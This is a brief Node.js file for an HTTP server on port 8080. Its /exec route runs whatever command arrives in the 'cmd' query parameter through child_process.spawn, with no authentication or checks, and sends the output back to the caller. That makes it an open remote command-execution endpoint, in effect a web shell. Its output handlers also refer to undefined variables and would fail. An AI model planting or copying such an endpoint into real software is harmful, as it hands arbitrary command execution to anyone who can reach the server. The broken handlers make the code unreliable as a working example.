var Http = require('http');
const { exec, spawn } = require("child_process");
var Uri = require('url');

//create a server object:
Http.createServer(function (req, res) {
    var reqData = Uri.parse(req.url, true);
    var params = reqData.query;
    console.log(`Request: ${req.url}`);

    if (reqData.path.startsWith("/exec")) {
        var cmd = params.cmd;
        if (cmd == null) {
            cmd = "error: cmd is null";
        }
        console.log(`cmd: ${cmd}`);

        var child = spawn(cmd, ['']);

        child.stdout.on('data', function (data) {
          console.log('stdout: ' + data);
          res.write(`data: ${stdout}`);
        });

        child.stderr.on('data', function (data) {
          console.log('stderr: ' + data);
          res.write(`error: ${error.message}`);
        });

        child.on('close', function (code) {
            console.log('child process exited with code ' + code);
            res.end();
        });

    }else if(reqData.path.startsWith("/stop")){
        exec("exit 0", (error, stdout, stderr) => {
            if (error) {
                console.log(`error: ${error.message}`);
                res.write(`error: ${error.message}`);
                return;
            }
            if (stderr) {
                console.log(`stderr: ${stderr}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
            res.write(`data: ${stdout}`); //write a response to the client
            res.end(); //end the response
        });
    }
}).listen(8080);